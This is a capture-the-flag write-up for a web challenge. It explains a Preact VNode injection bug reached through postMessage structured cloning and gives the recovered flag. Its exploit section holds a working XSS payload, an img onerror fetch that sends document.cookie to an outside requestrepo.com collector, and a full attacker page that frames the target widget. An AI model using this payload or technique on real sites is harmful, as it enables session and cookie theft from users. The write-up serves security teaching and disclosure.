# Delivery Support
- Category: web
- Author: sanmatte

## Description
Given description:
> They messed up, and won't even answer on their stupid customer service.

[https://deliverysupport.challs.srdnlen.it/](https://deliverysupport.challs.srdnlen.it/)

## Details
The site is a static "Porter Parcel" help center. `index.html` embeds `/widget.html` in an iframe, and the widget is a Preact `10.29.8` app.

The widget listens for messages from its parent:

```js
function receive(event) {
  if (event.source !== parent) return;
  if (event.data?.type === 'chat-message') addMessage(event.data.content);
}
```

`addMessage` stores `content` and the chat renders it as a normal Preact child:

```js
h('p', { key: index, class: `message ${message.sender}` }, message.content)
```

The bot visits an arbitrary URL with a non-`HttpOnly` `flag` cookie for `deliverysupport.challs.srdnlen.it`.

## The Preact bug
Preact marks its VNodes with `constructor: undefined` and uses that as the JSON-injection guard:

```js
if (newVNode.constructor !== UNDEFINED) return NULL;
```

JSONing does not preserve `undefined`, which is why the CVE-2026-22028 fix (strict equality instead of `==`) blocks JSON VNode injection. But `postMessage` uses structured clone, which does preserve the `constructor: undefined` property.

So we can send a forged VNode from a cross-origin window. If the widget renders it as a child, we control `type` and `props`, including `dangerouslySetInnerHTML`, which Preact writes to `dom.innerHTML`.

I reported this issue, and they implemented some hardening in
https://github.com/preactjs/preact/pull/5335.

## Exploit
Forged VNode:

```js
const payload = {
  type: 'span',
  props: {
    dangerouslySetInnerHTML: {
      __html: '<img src=x onerror=fetch("https://58255q34.requestrepo.com?c="+document.cookie)>'
    }
  },
  constructor: undefined,
  __v: 1,
  __u: 0
};
```

Full exploit:

```html
<!doctype html>
<html>
<body>
  <iframe
    id="target"
    src="https://deliverysupport.challs.srdnlen.it/widget.html">
  </iframe>

  <script>
    const frame = document.getElementById('target');

    addEventListener('message', event => {
      if (event.source !== frame.contentWindow) return;
      if (event.data?.type !== 'widget-ready') return;

      const payload = {
        type: 'span',
        props: {
          dangerouslySetInnerHTML: {
            __html: '<img src=x onerror=fetch("https://58255q34.requestrepo.com?c="+document.cookie)>'
          }
        },
        constructor: undefined,
        __v: 1,
        __u: 0
      };

      frame.contentWindow.postMessage({
        type: 'chat-message',
        content: payload
      }, 'https://deliverysupport.challs.srdnlen.it/');
    });
  </script>
</body>
</html>
```

## Flag
`srdnlen{vn0de_1nj3ct1on_are_4_th1ng_uh}`
